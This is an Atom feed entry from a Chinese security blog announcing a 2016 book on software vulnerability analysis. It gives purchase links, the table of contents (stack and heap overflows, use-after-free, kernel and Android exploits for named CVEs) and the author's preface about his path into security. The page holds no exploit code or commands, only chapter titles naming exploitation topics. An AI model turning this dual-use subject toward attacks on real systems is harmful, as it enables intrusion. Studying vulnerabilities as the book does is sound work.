<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>riusksk&#39;s blog</title>
  <subtitle>攀蟾折桂摄寰宇，摘星揽月御乾坤。踏云踩雾骋宵壤，驱风逐日闯天地。 ------泉哥</subtitle>
  <link href="//atom.xml" rel="self"/>
  
  <link href="http://riusksk.github.io/"/>
  <updated>2016-07-02T03:21:34.000Z</updated>
  <id>http://riusksk.github.io/</id>
  
  <author>
    <name>riusksk</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《漏洞战争：软件漏洞分析精要》预售中</title>
    <link href="http://riusksk.github.io/2016/07/02/%E3%80%8A%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81%E3%80%8B%E9%A2%84%E5%94%AE%E4%B8%AD/"/>
    <id>http://riusksk.github.io/2016/07/02/《漏洞战争：软件漏洞分析精要》预售中/</id>
    <published>2016-07-02T03:08:34.000Z</published>
    <updated>2016-07-02T03:21:34.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/media/book.png&quot; alt=&quot;&quot;&gt;&lt;/center&gt;

&lt;h3 id=&quot;预售地址&quot;&gt;&lt;a href=&quot;#预售地址&quot; class=&quot;headerlink&quot; title=&quot;预售地址　&quot;&gt;&lt;/a&gt;预售地址　&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://product.china-pub.com/4971073#qy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;China-Pub&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://search.jd.com/Search?keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;wq=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;pvid=3wfwj4qi.gk4kteggu1ql3#keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;qrst=1&amp;amp;rt=1&amp;amp;stop=1&amp;amp;vt=2&amp;amp;psort=2&amp;amp;click=2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;京东&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://world.taobao.com/search/search.htm?sort=price&amp;amp;_ksTS=1467426638963_384&amp;amp;spm=a21bp.7806943.20151106.1&amp;amp;search_type=0&amp;amp;json=on&amp;amp;cna=L%20rnC6dL4EYCATr7VsQhHYop&amp;amp;module=sortList&amp;amp;_input_charset=utf-8&amp;amp;navigator=all&amp;amp;s=0&amp;amp;q=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81&amp;amp;callback=__jsonp_cb&amp;amp;abtest=_AB-LR517-LR854-LR895-PR517-PR854-PV895_2462&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;淘宝&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;编辑推荐&quot;&gt;&lt;a href=&quot;#编辑推荐&quot; class=&quot;headerlink&quot; title=&quot;编辑推荐　&quot;&gt;&lt;/a&gt;编辑推荐　&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》是这些年来难得一见的系统、全面深入分析漏洞攻防心要与战术的书籍。《漏洞战争：软件漏洞分析精要》结合经典的漏洞案例，从攻防思路、分析方法与实战等方面对漏洞攻防做了详细的阐述。既照顾了全局的视野，又不失细节上的周到，对于有志于安全事业并想在安全技术分析上有所提升的读者，这是一本可信赖的必备书籍。正如wushi老师所说：”……对照本书动手调试这些经典漏洞，我相信只要认真做一遍，功力会大增。”&lt;br&gt;还犹豫什么呢，好书，一本就够！&lt;/p&gt;
&lt;h3 id=&quot;内容简介&quot;&gt;&lt;a href=&quot;#内容简介&quot; class=&quot;headerlink&quot; title=&quot;内容简介&quot;&gt;&lt;/a&gt;内容简介&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》系统地讲解软件漏洞分析与利用所需的各类工具、理论技术和实战方法，主要涉及Windows 和Android 系统平台。《漏洞战争：软件漏洞分析精要》根据不同的软件漏洞类型划分，比如堆栈溢出、沙盒逃逸、类型混淆、UAF、内核漏洞等，同时又针对当前流行的移动安全，加入Android 平台上的漏洞分析与利用。以精心挑选的经典漏洞为例，以分享漏洞的分析技巧和工具为主，对这些漏洞的成因、利用及修复方法进行详细讲解，旨在”授之以渔”。《漏洞战争：软件漏洞分析精要》最大的特点是以各种类型的经典漏洞作为实战讲解，摒弃空头理论，几乎是”一本用调试器写出来的书”。&lt;br&gt;《漏洞战争：软件漏洞分析精要》适合计算机相关专业的本科及研究生，信息安全爱好者，软件安全及移动安全相关的安全从业人员，软件开发与测试人员、黑客等阅读。 &lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h3&gt;&lt;p&gt;第1 章 基础知识 1&lt;br&gt;11 漏洞的相关概念 1&lt;br&gt;111 什么是漏洞 1&lt;br&gt;112 漏洞的价值 1&lt;br&gt;113 0Day 漏洞 2&lt;br&gt;114 PoC 与Exploit 2&lt;br&gt;12 为什么要分析漏洞 2&lt;br&gt;13 常用分析工具 3&lt;br&gt;131 IDA-反汇编利器 3&lt;br&gt;132 OllyDbg-破解与逆向常用调试器 4&lt;br&gt;133 Immunity Debugger-漏洞分析专用调试器 4&lt;br&gt;134 WinDbg-微软正宗调试器 5&lt;br&gt;135 GDB-Linux 调试器 6&lt;br&gt;136 JEB-Android 反编译器 7&lt;br&gt;137 其他 8&lt;br&gt;14 常见的漏洞分析方法 8&lt;br&gt;141 静态分析 8&lt;br&gt;142 动态调试 9&lt;br&gt;143 源码分析 9&lt;br&gt;144 补丁比较 9&lt;br&gt;145 污点追踪 10&lt;br&gt;15 学习资源 11&lt;br&gt;151 站点分享 11&lt;br&gt;152 书籍推荐 12&lt;br&gt;16 本章总结 13&lt;br&gt;第2 章 栈溢出漏洞分析 14&lt;br&gt;21 栈溢出简史 14&lt;br&gt;22 栈溢出原理 15&lt;br&gt;23 CVE-2010-2883 Adobe Reader TTF 字体SING 表栈溢出漏洞 16&lt;br&gt;231 LuckyCat 攻击事件 16&lt;br&gt;232 漏洞描述 18&lt;br&gt;233 分析环境 18&lt;br&gt;234 基于字符串定位的漏洞分析方法 19&lt;br&gt;235 样本Exploit 技术分析 20&lt;br&gt;236 样本Shellcode 恶意行为分析 26&lt;br&gt;237 漏洞修复 29&lt;br&gt;24 CVE-2010-3333 Microsoft RTF 栈溢出漏洞 30&lt;br&gt;241 林来疯攻击事件 30&lt;br&gt;242 漏洞描述 31&lt;br&gt;243 分析环境 31&lt;br&gt;244 RTF 文件格式 32&lt;br&gt;245 基于栈回溯的漏洞分析方法 33&lt;br&gt;246 漏洞利用 41&lt;br&gt;247 Office 2003 与Office 2007 Exploit 通用性研究 42&lt;br&gt;248 漏洞修复 45&lt;br&gt;25 CVE-2011-0104 Microsoft Excel TOOLBARDEF Record 栈溢出漏洞 51&lt;br&gt;251 漏洞描述 51&lt;br&gt;252 分析环境 52&lt;br&gt;253 基于污点追踪思路的漏洞分析方法 52&lt;br&gt;254 漏洞修复 59&lt;br&gt;26 阿里旺旺ActiveX 控件imageMandll 栈溢出漏洞 60&lt;br&gt;261 漏洞描述 60&lt;br&gt;262 分析环境 60&lt;br&gt;263 针对ActiveX 控件的漏洞分析方法 60&lt;br&gt;264 漏洞利用 63&lt;br&gt;27 CVE-2012-0158 Microsoft Office MSCOMCTLocx 栈溢出漏洞 65&lt;br&gt;271 Lotus Blossom 行动 65&lt;br&gt;272 漏洞描述 65&lt;br&gt;273 分析环境 65&lt;br&gt;274 基于OffVis 工具的Office 漏洞分析方法 66&lt;br&gt;275 漏洞修复 71&lt;br&gt;28 总结 72&lt;br&gt;第3 章 堆溢出漏洞分析 73&lt;br&gt;31 堆溢出简史 73&lt;br&gt;32 堆溢出原理 74&lt;br&gt;33 堆调试技巧 79&lt;br&gt;331 堆尾检查 80&lt;br&gt;332 页堆 81&lt;br&gt;34 CVE-2010-2553 Microsoft Cinepak Codec CVDecompress 函数堆溢出漏洞 85&lt;br&gt;341 漏洞描述 85&lt;br&gt;342 分析环境 85&lt;br&gt;343 基于HeapPage 的堆漏洞分析方法 85&lt;br&gt;344 漏洞修复 101&lt;br&gt;35 CVE-2012-0003 Microsoft Windows Media Player winmmdll MIDI 文件堆溢出漏洞 104&lt;br&gt;351 关于”蜘蛛”漏洞攻击包（Zhi-Zhu Exploit Pack） 104&lt;br&gt;352 漏洞描述 105&lt;br&gt;353 分析环境 105&lt;br&gt;354 MIDI 文件格式 105&lt;br&gt;355 基于导图推算的漏洞分析方法 107&lt;br&gt;356 漏洞利用 122&lt;br&gt;357 补丁比较 130&lt;br&gt;36 CVE-2013-0077 Microsoft DirectShow quartzdll m2p 文件堆溢出漏洞 130&lt;br&gt;361 漏洞描述 130&lt;br&gt;362 基于HTC 的漏洞分析方法 131&lt;br&gt;363 漏洞修复 134&lt;br&gt;37 CVE-2012-1876 Internet Exporter MSHTMLdll CalculateMinMax 堆溢出漏洞 135&lt;br&gt;371 在Pwn2Own 黑客大赛上用于攻破IE9 的漏洞 135&lt;br&gt;372 分析环境 135&lt;br&gt;373 基于HPA 的漏洞分析方法 135&lt;br&gt;374 通过信息泄露实现漏洞利用 149&lt;br&gt;375 漏洞修复 161&lt;br&gt;38 小结 163&lt;br&gt;第4 章 整数溢出漏洞分析 164&lt;br&gt;41 整数溢出简史 164&lt;br&gt;42 整数溢出原理 164&lt;br&gt;421 基于栈的整数溢出 165&lt;br&gt;422 基于堆的整数溢出 166&lt;br&gt;43 CVE-2011-0027 Microsoft Data Access Components 整数溢出漏洞 167&lt;br&gt;431 在Pwn2Own 黑客大赛上用于攻破IE8 的漏洞 167&lt;br&gt;432 基于堆分配记录的漏洞分析方法 168&lt;br&gt;433 补丁比较 176&lt;br&gt;44 CVE-2012-0774 Adobe Reader TrueType 字体整数溢出漏洞 178&lt;br&gt;441 漏洞描述 178&lt;br&gt;442 PDF 文件格式与常用分析工具 178&lt;br&gt;443 基于条件记录断点的漏洞分析方法 182&lt;br&gt;444 补丁分析 196&lt;br&gt;45 CVE-2013-0750 Firefox 字符串替换整数溢出漏洞 197&lt;br&gt;451 漏洞描述 197&lt;br&gt;452 基于源码调试的漏洞分析方法 197&lt;br&gt;453 源码比对 207&lt;br&gt;46 CVE-2013-2551 Internet Explorer VML COALineDashStyleArray 整数溢出漏洞 208&lt;br&gt;461 在Pwn2Own 黑客大赛上攻破IE10 的漏洞 208&lt;br&gt;462 基于类函数定位的漏洞分析方法 208&lt;br&gt;463 利用信息泄露实现漏洞利用 223&lt;br&gt;47 总结 226&lt;br&gt;第5 章 格式化字符串漏洞分析 227&lt;br&gt;51 格式化字符串漏洞简史 227&lt;br&gt;52 格式化字符串漏洞的原理 227&lt;br&gt;53 CVE-2012-0809 Sudo sudo_debug 函数格式化字符串漏洞 234&lt;br&gt;531 漏洞描述 234&lt;br&gt;532 通过源码比对分析漏洞 234&lt;br&gt;54 CVE-2012-3569 VMware OVF Tool 格式化字符串漏洞 235&lt;br&gt;541 漏洞描述 235&lt;br&gt;542 基于输出消息的漏洞定位方法 235&lt;br&gt;543 漏洞利用 239&lt;br&gt;55 总结 242&lt;br&gt;第6 章 双重释放漏洞分析 243&lt;br&gt;61 双重释放漏洞简史 243&lt;br&gt;62 双重释放漏洞的原理 243&lt;br&gt;63 CVE-2010-3974 Windows 传真封面编辑器fxscoverexe 双重释放漏洞 246&lt;br&gt;631 漏洞描述 246&lt;br&gt;632 通过栈回溯和堆状态判定漏洞类型 246&lt;br&gt;633 通过补丁比较确定漏洞成因及修复方法 249&lt;br&gt;64 CVE-2014-0502 Adobe Flash Player 双重释放漏洞 251&lt;br&gt;641 GreedyWonk 行动 251&lt;br&gt;642 静态分析攻击样本 251&lt;br&gt;643 Shellcode 自动化模拟执行 263&lt;br&gt;644 基于ROP 指令地址的反向追踪 265&lt;br&gt;65 总结 273&lt;br&gt;第7 章 释放重引用漏洞分析 274&lt;br&gt;71 释放重引用（Use After Free，UAF）漏洞简史 274&lt;br&gt;72 UAF 漏洞的原理 274&lt;br&gt;73 CVE-2011-0065 Firefox mChannel UAF 漏洞 277&lt;br&gt;731 漏洞描述 277&lt;br&gt;732 通过动态调试快速定位漏洞源码 277&lt;br&gt;733 漏洞利用 285&lt;br&gt;734 源码比对 286&lt;br&gt;74 CVE-2013-1347 Microsoft IE CGenericElement UAF 漏洞 287&lt;br&gt;741 “水坑”攻击事件 287&lt;br&gt;742 通过HPA 快速定位漏洞对象 287&lt;br&gt;743 逆向分析IE 引擎对JavaScript 代码的解析 290&lt;br&gt;744 追本溯源：探寻漏洞的本质 321&lt;br&gt;745 漏洞利用 324&lt;br&gt;75 CVE-2013-3346 Adobe Reader ToolButton UAF 漏洞 326&lt;br&gt;751 “Epic Turla”网络间谍攻击行动 326&lt;br&gt;752 使用peepdf 分析PDF 恶意样本 326&lt;br&gt;753 漏洞利用 338&lt;br&gt;76 CVE-2015-0313 Adobe Flash Player Workers ByteArray UAF 漏洞 340&lt;br&gt;761 漏洞描述 340&lt;br&gt;762 分析ActiveScript 虚拟机源码辅助漏洞调试 340&lt;br&gt;763 Flash JIT 调试插件与符号文件 353&lt;br&gt;764 漏洞利用 354&lt;br&gt;765 漏洞修复 360&lt;br&gt;77 本章总结 360&lt;br&gt;第8 章 数组越界访问漏洞分析 361&lt;br&gt;81 数组越界与溢出的关系 361&lt;br&gt;82 数组越界访问漏洞原理 361&lt;br&gt;83 CVE-2011-2110 Adobe Flash Player 数组越界访问漏洞 363&lt;br&gt;831 漏洞描述 363&lt;br&gt;832 解决安装旧版Flash Player 的限制问题 364&lt;br&gt;833 通过Perl 脚本辅助分析样本 365&lt;br&gt;834 搭建服务器重现漏洞场景 371&lt;br&gt;835 通过修改样本代码定位漏洞 373&lt;br&gt;836 通过构造信息泄露利用漏洞 376&lt;br&gt;837 通过搜索指令序列分析补丁 380&lt;br&gt;84 CVE-2014-0160 OpenSSL TLS 数组越界访问漏洞（”心脏出血”） 382&lt;br&gt;841 漏洞描述 382&lt;br&gt;842 基于源码对比与跟踪的漏洞分析方法 383&lt;br&gt;843 利用漏洞盗取网站账号 389&lt;br&gt;85 本章总结 394&lt;br&gt;第9 章 内核漏洞分析 395&lt;br&gt;91 Windows 内核漏洞漫谈 395&lt;br&gt;92 Windows 内核调试环境搭建 396&lt;br&gt;93 常见内核漏洞原理与利用 398&lt;br&gt;931 漏洞成因分析 398&lt;br&gt;932 漏洞利用 405&lt;br&gt;94 360 安全卫士bregdrvsys 本地提权漏洞分析 414&lt;br&gt;941 漏洞描述 414&lt;br&gt;942 基于导出函数和IO 控制码的追踪分析 414&lt;br&gt;95 CVE-2011-2005 Windows Afdsys 本地提权漏洞 423&lt;br&gt;951 漏洞描述 423&lt;br&gt;952 从利用代码到漏洞函数的定位分析 423&lt;br&gt;953 补丁比较 426&lt;br&gt;96 CVE-2013-3660 Windows win32ksys EPATHOB 指针未初始化漏洞 426&lt;br&gt;961 漏洞描述 426&lt;br&gt;962 通过IDA 定义结构体辅助分析 427&lt;br&gt;963 漏洞利用 431&lt;br&gt;97 CVE-2014-1767 Windows AFDsys 双重释放漏洞（Pwn2Own 2014） 437&lt;br&gt;971 Pwnie Awards 2014”最佳提权漏洞奖”得主 437&lt;br&gt;972 基于IOCTL 处理函数自动追踪记录的分析方法 437&lt;br&gt;973 漏洞利用 454&lt;br&gt;974 补丁分析 460&lt;br&gt;98 本章总结 462&lt;br&gt;第10 章 Android 平台漏洞分析 463&lt;br&gt;101 Android 平台漏洞简史 463&lt;br&gt;102 Android 平台漏洞分类 466&lt;br&gt;103 常见的漏洞分析方法 467&lt;br&gt;1031 APK 静态分析 467&lt;br&gt;1032 smali 动态调试 468&lt;br&gt;1033 so 库动态调试 474&lt;br&gt;1034 补丁源码比对 475&lt;br&gt;1035 系统Java 源码调试 477&lt;br&gt;1036 系统C/C++源码调试 486&lt;br&gt;1037 Android 内核源码调试 488&lt;br&gt;104 智能插座漏洞分析 492&lt;br&gt;1041 漏洞描述 492&lt;br&gt;1042 静态逆向分析 492&lt;br&gt;1043 利用漏洞控制网络上的任意插座 497&lt;br&gt;1044 总结 502&lt;br&gt;105 CVE-2013-4787 Android 系统签名漏洞 502&lt;br&gt;1051 漏洞描述 502&lt;br&gt;1052 Android 签名机制 503&lt;br&gt;1053 漏洞重现 509&lt;br&gt;1054 漏洞原理分析 514&lt;br&gt;1055 漏洞修复 516&lt;br&gt;106 CVE-2010-1119 Android WebKit UAF 漏洞 516&lt;br&gt;1061 漏洞描述 516&lt;br&gt;1062 漏洞利用 517&lt;br&gt;1063 通过补丁源码分析漏洞成因 524&lt;br&gt;107 CVE-2014-3153 Android 内核Futex 提权漏洞（Towelroot） 528&lt;br&gt;1071 Android 设备Root 神器-Towelroot 528&lt;br&gt;1072 通过内核源码调试分析漏洞 528&lt;br&gt;1073 漏洞利用 548&lt;br&gt;1074 漏洞修复 554&lt;br&gt;108 本章总结 554&lt;br&gt;第11 章 其他类型的漏洞分析 555&lt;br&gt;111 本章引言 555&lt;br&gt;112 CVE-2013-2423 JAVA Applet reflection 类型混淆代码执行漏洞 555&lt;br&gt;1121 漏洞描述 555&lt;br&gt;1122 类型混淆漏洞 555&lt;br&gt;1123 Java 安全机制 556&lt;br&gt;1124 漏洞分析与利用 558&lt;br&gt;1125 漏洞修复 562&lt;br&gt;1126 2013 年漏洞之王-Java 563&lt;br&gt;113 CVE-2014-0257 Microsoft Internet Explorer 11 dfsvc 组件沙盒逃逸漏洞 564&lt;br&gt;1131 漏洞描述 564&lt;br&gt;1132 IE 沙盒保护原理 564&lt;br&gt;1133 IE 沙盒攻击面分析 569&lt;br&gt;1134 CVE-2014-0257 漏洞分析与利用 570&lt;br&gt;114 CVE-2014-9150 Adobe Acrobat Reader MoveFileEx IPC Hook 竞争条件&lt;br&gt;（沙盒逃逸）漏洞 572&lt;br&gt;1141 Therac-25 医疗事故 572&lt;br&gt;1142 竞争条件漏洞原理 573&lt;br&gt;1143 CVE-2014-9150 漏洞描述 574&lt;br&gt;1144 Adobe 沙盒简介 574&lt;br&gt;1145 利用漏洞实现沙盒逃逸 575&lt;br&gt;115 本章总结 578&lt;br&gt;第12 章 软件漏洞发展趋势 579&lt;br&gt;121 软件漏洞领域的新挑战 579&lt;br&gt;122 移动终端漏洞发展趋势 579&lt;br&gt;123 云计算平台漏洞发展趋势 581&lt;br&gt;124 物联网漏洞发展趋势 583&lt;br&gt;125 本章总结 585 &lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言　　&quot;&gt;&lt;/a&gt;前言　　&lt;/h3&gt;&lt;h4 id=&quot;为什么写这本书&quot;&gt;&lt;a href=&quot;#为什么写这本书&quot; class=&quot;headerlink&quot; title=&quot;为什么写这本书&quot;&gt;&lt;/a&gt;为什么写这本书&lt;/h4&gt;&lt;p&gt;　　不知道大家是否曾有过这样的经历：&lt;br&gt;　　&lt;br&gt;　　● 无法读懂网上很多软件漏洞分析文章，不理解里面的漏洞成因和漏洞利用技巧。&lt;br&gt;　　● 即使读懂某篇软件漏洞分析文章，自己仍无法独立完成相同漏洞的分析。如果文章中所使用的&lt;br&gt;　　测试环境与软件版本跟自己使用的不一样，则顿时更不知如何入手。&lt;br&gt;　　● 很多软件漏洞分析文章贴出存在漏洞的汇编代码，指出导致漏洞的原因，即”结论式分析”，但如何定位到此段代码并无解释，看完之后，仍不知如何快速定位，缺乏可借鉴的思路。&lt;br&gt;　　&lt;br&gt;　　带着这些问题，相信读者会在本书中找到想要的答案。&lt;br&gt;　　&lt;br&gt;　　再来聊下本书的一些写作经历，开始写作本书始于2012年5月，最初是”爱无言”找到我，说大家合作写一本关于软件漏洞案例分析的书，因为那段时间我在博客上每周都会分享一两篇软件漏洞分析的实际案例，而当时国内还没有专门写软件漏洞案例的专著（几年前出版的《0Day安全：软件漏洞分析技术》主要偏向堆和栈溢出及内核方面的漏洞分析，实际案例较少，且”爱无言”也是作者之一）。&lt;br&gt;　　就这样，两人开始谋划，写书的念头就此产生。&lt;br&gt;　　后来，我又拉了两位朋友加入，然后几人列出大纲目录，但最后因为种种原因，只剩下我一人独自完成本书创作，中途也多次想放弃，但庆幸的是，历时3年半，终于2015年12月完稿，共历时4年后出版。&lt;br&gt;　　就这样，一本原为”合著”的书就写成了”专著”。&lt;br&gt;　　由于朋友的退出，以及写作速度较慢，中途停写半年，已原本打算放弃。后来，有一天，编辑”皎子”找我聊了一些出书的想法。&lt;br&gt;　　就这样，一本原打算沉留箱底的”残卷”再次被”激活”。&lt;br&gt;　　之后的写书经历还算顺利，又历时一年左右完稿，比较符合预期，遗留心底多年的梗总算可以释怀了。&lt;br&gt;　　相信一些读者看完本书目录之后会有一些疑问，也相信其中一些疑问也是我在定位本书方向时考虑的，所以有必要在此谈一谈。&lt;/p&gt;
&lt;h4 id=&quot;Q：本书与《0day-安全：软件漏洞分析技术》有何区别？&quot;&gt;&lt;a href=&quot;#Q：本书与《0day-安全：软件漏洞分析技术》有何区别？&quot; class=&quot;headerlink&quot; title=&quot;Q：本书与《0day 安全：软件漏洞分析技术》有何区别？&quot;&gt;&lt;/a&gt;Q：本书与《0day 安全：软件漏洞分析技术》有何区别？&lt;/h4&gt;&lt;p&gt;A：0day安全一书主要是讲Windows平台下堆栈溢出和内核提权的漏洞分析技术，还涉及部分格式化字符串漏洞，从基础讲起，最后是实例分析。本书则完全是以真实的漏洞为实例以分享漏洞分析时的一些技巧，以漏洞类型的不同来分享不同的漏洞分析技巧，可以说是”用调试器写出来的一本书”，而且综合考虑当前热门的移动安全，特意加入Android平台上的漏洞分析章节，从Java层、Native层和内核层等方向分享不同的调试分析方法。从难度而言，本书比《0day安全：软件漏洞分析技术》一书更难，可以将本书当作进阶版，搭配学习。&lt;/p&gt;
&lt;h4 id=&quot;Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&quot;&gt;&lt;a href=&quot;#Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&quot; class=&quot;headerlink&quot; title=&quot;Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&quot;&gt;&lt;/a&gt;Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&lt;/h4&gt;&lt;p&gt;A：著书的宗旨在于”授人以鱼，不如授人以渔”。如果读者经常看网上的漏洞分析文章，就会发现一个常见现象：它们大多是”结论性分析”，而非”思路性分析”。换句话说，就是贴出存在漏洞的汇编代码，然后直接给出漏洞成因的结论，至于如何定位到漏洞代码，并没有给出分析思路。正因为如此，即使你看懂了Vupen漏洞军火商写的分析文章，也不代表你看完后就能独立分析出来，甚至在调试之后，你还会发现Vupen在一些文章里留有”坑”，故意省略或写错某些关键内容，如果没有自己实际调试一遍是很难发现这些问题的。&lt;br&gt;　　相信有一定软件漏洞分析经验的朋友会注意到，软件漏洞分析的大部分时间是花费在寻找和定位漏洞代码，而非分析存在漏洞的代码。对于有一定编程经验和漏洞基础的读者，如果直接给一段漏洞代码，可能很容易就看出来，但像Adobe和Windows这些复杂的软件或系统，在千千万万的代码行中找到漏洞代码是有一定难度的。因此，本书的重点是讲授如何快速地定位漏洞代码，针对不同漏洞类型采取不同的分析技巧，以帮助大家快速地分析出漏洞成因，制定检测、防御与修复方案。书中的漏洞实例分析技巧是可以长期运用和延伸的，这才是本书的核心价值。&lt;/p&gt;
&lt;h4 id=&quot;Q：如何借助本书提升自身的软件漏洞分析能力？&quot;&gt;&lt;a href=&quot;#Q：如何借助本书提升自身的软件漏洞分析能力？&quot; class=&quot;headerlink&quot; title=&quot;Q：如何借助本书提升自身的软件漏洞分析能力？&quot;&gt;&lt;/a&gt;Q：如何借助本书提升自身的软件漏洞分析能力？&lt;/h4&gt;&lt;p&gt;A：本书主要面向有一定软件漏洞基础的读者，如果缺乏这方面的基础，且有一定C语言和汇编语言基础，建议提前看看《0day安全：软件漏洞分析技术》一书。软件漏洞分析是一门实践性比较强的安全领域分支，需要许多实际动手的调试经验，因此建议大家在看本书时，一边看一边动手调试，以加深理解，就像骑自行车一样，熟练之后，哪怕十年未碰，也依然会骑。本书在分析漏洞时，也尽量以思路性地描述为主，以讲解分析漏洞时的思考方式和常用技巧，包括工具和方法论，因此大家在阅读时，应该掌握书中介绍的思考方式、工具运用及分析技巧，毕竟单个漏洞案例本身是会过时的，但技巧性的东西总是可以借鉴和扩展。&lt;br&gt;　　记得大一上第一节历史课时，老师说过这样一句话，如果在未来的某一天，你在和朋友闲聊时，能够运用到历史课上学到的知识，哪怕一句话作为谈资，那这历史课就算没白学。同样地，我也希望未来大家在分析软件漏洞时，本书能够提供一些帮助，哪怕是一个分析技巧，一个工具使用，我也觉得这4年的付出算值了。&lt;br&gt;　　&lt;br&gt;　　纵观近五年，各种APT攻击事件频发，包括知名企业，甚至国家级单位都曾遭受到漏洞攻击。每年都有一款产品的漏洞被频繁用于网络攻击，比如2012年的Office漏洞（还记得经典的CVE-2012-0158吗？），2013年的Java漏洞，2014年的Internet Explorer漏洞，2015年Adobe Flash漏洞。PC端上的软件漏洞一直在逐年增加，虽然厂商在不断地推出各种安全机制，但漏洞利用技术的发展从未间断，Exploiter们依然生存得很好。同时，互联网早已步入移动化时代，伴随着PC软件漏洞攻击事件的频发，移动端的漏洞攻击也在逐年增长。因此，笔者结合PC端（Windows）与移动端（Android）平台上的漏洞案例，历时近4年，将自身的实战经验整理成本书。&lt;/p&gt;
&lt;h4 id=&quot;求学之路&quot;&gt;&lt;a href=&quot;#求学之路&quot; class=&quot;headerlink&quot; title=&quot;求学之路&quot;&gt;&lt;/a&gt;求学之路&lt;/h4&gt;&lt;p&gt;　　经常有人问我：”一个医学生为什么会转行做安全？”，通常我都会这么回答：”因为小说看多了”。&lt;br&gt;　　大一时，由于喜欢看黑客小说，比如《黑客传说》《地狱黑客》《指间的黑客》，就去图书馆找一些黑客书籍学习，每天中午都不休息，几乎天天都泡在图书馆看书，甚至翘课去看计算机书。&lt;br&gt;　　大四才买计算机，在此之前一直都只能去网吧、学校机房或者借用舍友的计算机。当年就用诺基亚3100手机看完了《Windows程序设计》、《Windows核心编程》和《Windows环境下32位汇编语言程序设计》。后来就网购实体书来看，这样比在网吧看电子书更实惠。&lt;br&gt;　　大学期间，经常给《黑客防线》杂志投稿，一方面可以提高个人技术，一方面可以用稿费作为生活补贴，后来就用稿费加上我哥的经济支持，买下了第一台属于自己的计算机，本书就有一半内容是在那台计算机上完成的。&lt;br&gt;　　在求学这条道路上，我一直是一个人默默地前行着，就连一块生活了几年的舍友也不知道我在学习安全方面的知识，我买的一堆计算机书籍一直藏在宿舍衣柜最里面。在此过程中，自己走过很多弯路，甚至多次差点放弃，但很庆幸最后还是坚持下来了，并直至今日，依然在安全这条道路上前行着……&lt;/p&gt;
&lt;h4 id=&quot;面试经历&quot;&gt;&lt;a href=&quot;#面试经历&quot; class=&quot;headerlink&quot; title=&quot;面试经历&quot;&gt;&lt;/a&gt;面试经历&lt;/h4&gt;&lt;p&gt;　　在圈内朋友的建议下，我在大五（医学五年制）上学期开始找安全相关的工作，最终顺利拿到安恒和腾讯的offer。当初投简历给安恒时，安恒的副总裁看完简历后直接发了offer，我有点受宠若惊，也特别感谢安恒的信任，但最终还是选择了腾讯。面试腾讯的经历，我觉得是个有趣的过程，值得与大家分享。&lt;br&gt;　　那年我还在厦门市第二医院骨伤科实习，门诊部刚好不是特别忙，我在给一位腰椎患者做完针灸后，就接到来自腾讯安全中心的面试电话。然后趁主任不在，偷偷躲到门诊部后面的楼梯口进行电话面试，整个面试过程还算比较顺利，第2天腾讯安全中心就来电说希望我到深圳总部面试。&lt;br&gt;　　到了深圳总部后，腾讯安全中心的主管面试了我，虽然聊了一个半小时，但没有问我多少问题，聊完后直接被带去HR那里面试。&lt;br&gt;　　HR面试我时，并非以常规的话题开场，我们是以腰椎间盘突出的话题开场的，也算是一次别开生面的面试经历。&lt;br&gt;　　回到厦门后，我跟带教老师说明了转行情况，之后有上手术台的机会，我都会主动让给其他同班同学，让他们有更多上台练手的机会，而我自己自然有更多的时间去专研安全技术。&lt;/p&gt;
&lt;h4 id=&quot;加入腾讯&quot;&gt;&lt;a href=&quot;#加入腾讯&quot; class=&quot;headerlink&quot; title=&quot;加入腾讯&quot;&gt;&lt;/a&gt;加入腾讯&lt;/h4&gt;&lt;p&gt;　　腾讯是我的第一家雇主，也是目前我唯一工作过的公司，从我毕业一直工作到现在。在公司我见证了腾讯安全应急响应中心（TSRC）的成立与发展，帮助完善各种流程和标准，作为早期主要的漏洞审核者，我也从广大白帽子身上学到很多东西，包括各种漏洞挖掘与利用技术，涉及各个安全领域，如Web安全、驱动安全、应用软件安全、移动安全等，正是TSRC给了我更多学习的机会，使得我在安全技术上能够更加全面地发展。除此之外，我在公司也做一些安全研究工作，并研发出Android与iOS应用安全审计系统，已投入公司日常运营使用。&lt;br&gt;　　至今，我依然觉得工作能够与兴趣结合在一起，是一件既幸福又幸运的事，而选择腾讯依然是我当年的明智之举。&lt;/p&gt;
